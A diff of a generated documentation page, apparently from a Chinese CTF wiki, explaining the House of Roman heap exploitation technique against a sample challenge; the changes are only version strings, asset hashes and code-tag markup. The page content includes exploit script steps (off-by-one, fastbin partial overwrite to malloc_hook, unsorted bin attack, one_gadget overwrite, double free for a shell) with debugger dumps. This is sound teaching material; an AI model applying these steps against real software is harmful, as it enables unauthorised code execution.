@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4823,16 +4823,16 @@
 </ol>
 <p>先对 demo 进行一个大致的分析：</p>
 <p>开启的保护情况：</p>
-<div class="codehilite"><pre><span></span><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall&#39;</span>
+<div class="codehilite"><pre><span></span><code><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
     PIE:      PIE enabled
-</pre></div>
+</code></pre></div>
 
 <p>样题中有三个主要功能，Malloc ，Write，以及 Free。</p>
-<div class="codehilite"><pre><span></span>    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
+<div class="codehilite"><pre><span></span><code>    <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
     <span class="p">{</span>
       <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
         <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Malloc&quot;</span><span class="p">);</span>
@@ -4851,10 +4851,10 @@
       <span class="k">default</span><span class="o">:</span>
         <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Invalid choice&quot;</span><span class="p">);</span>
         <span class="k">break</span><span class="p">;</span>
-</pre></div>
+</code></pre></div>
 
 <p>在 Free 功能中存在 指针未置零而造成的悬挂指针。</p>
-<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">free_chunk</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span> <span class="nf">free_chunk</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-4h]@1</span>
 
@@ -4863,21 +4863,21 @@
   <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="o">&lt;=</span> <span class="mh">0x13</span> <span class="p">)</span>
     <span class="n">free</span><span class="p">(</span><span class="n">heap_ptrs</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">v0</span><span class="p">]);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="_4">第一步<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <p>首先伪造一个 chunk  ，chunk的大小为0x61。紧接着我们利用 partial overwrite 将 FD 指向伪造的chunk（当然，这里我们也可以用 UAF 完成）。</p>
 <p>伪造 chunk size</p>
-<div class="codehilite"><pre><span></span>pwndbg&gt;
+<div class="codehilite"><pre><span></span><code>pwndbg&gt;
 0x555555757050: 0x41414141      0x41414141      0x41414141      0x41414141
 0x555555757060: 0x41414141      0x41414141      0x41414141      0x41414141
 0x555555757070: 0x41414141      0x41414141      0x41414141      0x41414141
 0x555555757080: 0x41414141      0x41414141      0x41414141      0x41414141
 0x555555757090: 0x41414141      0x41414141      0x61    0x0     &lt;----------
-</pre></div>
+</code></pre></div>
 
 <p>这里，我们 free 掉 chunk 1，这个时候我们能获得一个 unsortbin</p>
-<div class="codehilite"><pre><span></span>0x555555757020 PREV_INUSE {
+<div class="codehilite"><pre><span></span><code>0x555555757020 PREV_INUSE {
   prev_size = 0x0,
   size = 0xd1,
   fd = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,
@@ -4885,10 +4885,10 @@
   fd_nextsize = 0x4141414141414141,
   bk_nextsize = 0x4141414141414141
 }
-</pre></div>
+</code></pre></div>
 
 <p>接着，我们重分配 0xd1 这块 chunk，以及修改其 size 为0x71</p>
-<div class="codehilite"><pre><span></span>pwndbg&gt; x/40ag 0x555555757020
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; x/40ag 0x555555757020
 0x555555757020: 0x4141414141414141      0x71
 0x555555757030: 0x7ffff7dd1b58 &lt;main_arena+88&gt;  0x7ffff7dd1b58 &lt;main_arena+88&gt;
 0x555555757040: 0x4141414141414141      0x4141414141414141
@@ -4897,10 +4897,10 @@
 0x555555757070: 0x4141414141414141      0x4141414141414141
 0x555555757080: 0x4141414141414141      0x4141414141414141
 0x555555757090: 0x4141414141414141      0x61
-</pre></div>
+</code></pre></div>
 
 <p>我们紧接着需要修正这0x71 FD freelist ，将其伪造成已经释放的块</p>
-<div class="codehilite"><pre><span></span>pwndbg&gt; x/40ag 0x555555757000
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; x/40ag 0x555555757000
 0x555555757000: 0x0     0x21
 0x555555757010: 0x4141414141414141      0x4141414141414141
 0x555555757020: 0x4141414141414141      0x71       &lt;----------  free 0x71
@@ -4921,10 +4921,10 @@
 0x555555757110: 0x0     0x0
 0x555555757120: 0x0     0x0
 0x555555757130: 0x0     0x0
-</pre></div>
+</code></pre></div>
 
-<div class="codehilite"><pre><span></span>libc : 0x7ffff7a23d28 (&quot;malloc_hook&quot;)
-</pre></div>
+<div class="codehilite"><pre><span></span><code>libc : 0x7ffff7a23d28 (&quot;malloc_hook&quot;)
+</code></pre></div>
 
 <p>这个时候我们的 FD 已经在 malloc hook 附近，为之后的爆破做准备。</p>
 <h3 id="_5">第二步<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
@@ -4933,7 +4933,7 @@
 <p>利用 unsortebin 的攻击技巧，并使用编辑功能将 onegadet 写入    。</p>
 <h2 id="exp">分析 exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
 <p>分配 <code>3</code> 个 <code>chunk</code> ，在 <code>B + 0x78</code> 处设置 <code>p64(0x61)</code> ， 作用是 <code>fake size</code> ,用于后面 的 <code>fastbin attack</code></p>
-<div class="codehilite"><pre><span></span><span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 0x20</span>
+<div class="codehilite"><pre><span></span><code><span class="n">create</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># 0x20</span>
 <span class="n">create</span><span class="p">(</span><span class="mh">0xc8</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># d0</span>
 <span class="n">create</span><span class="p">(</span><span class="mh">0x65</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># 0x70</span>
 
@@ -4942,10 +4942,10 @@
 <span class="n">fake</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span>  <span class="c1">## fake size</span>
 <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">fake</span><span class="p">)</span>
 <span class="n">info</span><span class="p">(</span><span class="s2">&quot;fake&quot;</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>释放掉 <code>B</code> , 然后分配同样大小再次分配到 <code>B</code> , 此时 <code>B+0x10</code> 和 <code>B+0x18</code> 中有 <code>main_arean</code> 的地址。分配 <code>3</code> 个 <code>fastbin</code> ，利用 <code>off by one</code> 修改 <code>B-&gt;size = 0x71</code></p>
-<div class="codehilite"><pre><span></span>free(1)
+<div class="codehilite"><pre><span></span><code>free(1)
 create(0xc8,1)
 
 create(0x65,3)  # b
@@ -4956,19 +4956,19 @@ over = &quot;A&quot;*0x18  # off by one
 over += &quot;\x71&quot;  # set chunk  1&#39;s size --&gt; 0x71
 edit(0,over)
 info(&quot;利用 off by one ,  chunk  1&#39;s size --&gt; 0x71&quot;)
-</pre></div>
+</code></pre></div>
 
 <p>生成两个 <code>fastbin</code> ，然后利用 <code>uaf</code> ，部分地址写，把 <code>B</code> 链入到 <code>fastbin</code></p>
-<div class="codehilite"><pre><span></span><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 <span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
 <span class="n">info</span><span class="p">(</span><span class="s2">&quot;创建两个 0x70 的 fastbin&quot;</span><span class="p">)</span>
 <span class="n">heap_po</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x20</span><span class="s2">&quot;</span>
 <span class="n">edit</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="n">heap_po</span><span class="p">)</span>
 <span class="n">info</span><span class="p">(</span><span class="s2">&quot;把 chunk&#39;1 链入到 fastbin 里面&quot;</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>调试看看此时 <code>fastbin</code> 的状态</p>
-<div class="codehilite"><pre><span></span>pwndbg&gt; fastbins 
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; fastbins 
 fastbins
 0x20: 0x0
 0x30: 0x0
@@ -4977,32 +4977,32 @@ fastbins
 0x60: 0x0
 0x70: 0x555555757160 —▸ 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x7ffff7dd1b78
 0x80: 0x0
-</pre></div>
+</code></pre></div>
 
 <blockquote>
 <p><code>0x555555757020</code> 就是 <code>chunk B</code></p>
 </blockquote>
 <p>然后通过修改 <code>B-&gt;fd</code> 的低 <code>2</code> 字节， 使得 <code>B-&gt;fd= malloc_hook - 0x23</code></p>
-<div class="codehilite"><pre><span></span># malloc_hook 上方
+<div class="codehilite"><pre><span></span><code># malloc_hook 上方
 malloc_hook_nearly = &quot;\xed\x1a&quot;
 edit(1,malloc_hook_nearly)
 info(&quot;部分写，修改 fastbin-&gt;fd ---&gt; malloc_hook&quot;)
-</pre></div>
+</code></pre></div>
 
 <p>然后分配 <code>3</code> 个 <code>0x70</code> 的 <code>chunk</code> ，就可以拿到 <code>malloc_hook</code> 所在的那个 <code>chunk</code> .</p>
-<div class="codehilite"><pre><span></span>create(0x65,0)
+<div class="codehilite"><pre><span></span><code>create(0x65,0)
 create(0x65,0)
 create(0x65,0)
-</pre></div>
+</code></pre></div>
 
 <p>然后 <code>free</code> 掉 <code>E</code> ，进入 <code>fastbin</code> ，利用 <code>uaf</code> 设置 <code>E-&gt;fd = 0</code> ， 修复了 <code>fastbin</code></p>
-<div class="codehilite"><pre><span></span>free(15)
+<div class="codehilite"><pre><span></span><code>free(15)
 edit(15,p64(0x00))
 info(&quot;再次生成 0x71 的 fastbin, 同时修改 fd =0, 修复 fastbin&quot;)
-</pre></div>
+</code></pre></div>
 
 <p>然后是 unsorted bin 攻击，使得 malloc_hook 的值为 main_arena+88</p>
-<div class="codehilite"><pre><span></span>create(0xc8,1)
+<div class="codehilite"><pre><span></span><code>create(0xc8,1)
 create(0xc8,1)
 create(0x18,2)
 create(0xc8,3)
@@ -5013,20 +5013,20 @@ po += &quot;\x00\x1b&quot;
 edit(1,po)
 create(0xc8,1)
 info(&quot;unsorted bin 使得 malloc_hook 有 libc 的地址&quot;)
-</pre></div>
+</code></pre></div>
 
 <p>利用 修改 <code>malloc_hook</code> 的低三个字节 ，使得 <code>malloc_hook</code> 为 <code>one_gadget</code> 的地址</p>
-<div class="codehilite"><pre><span></span>over = &quot;R&quot;*0x13   # padding for malloc_hook
+<div class="codehilite"><pre><span></span><code>over = &quot;R&quot;*0x13   # padding for malloc_hook
 over += &quot;\xa4\xd2\xaf&quot;
 edit(0,over)
 
 info(&quot;malloc_hook to one_gadget&quot;)
-</pre></div>
+</code></pre></div>
 
 <p>然后 <code>free</code>  两次同一个  <code>chunk</code>  ，触发  <code>malloc_printerr</code>  ， <code>getshell</code></p>
-<div class="codehilite"><pre><span></span>free(18)
+<div class="codehilite"><pre><span></span><code>free(18)
 free(18)
-</pre></div>
+</code></pre></div>
 
 <h2 id="link">link<a class="headerlink" href="#link" title="Permanent link">&para;</a></h2>
 <p><a href="https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc">https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc</a></p>
@@ -5132,7 +5132,7 @@ free(18)
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5147,7 +5147,7 @@ free(18)
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
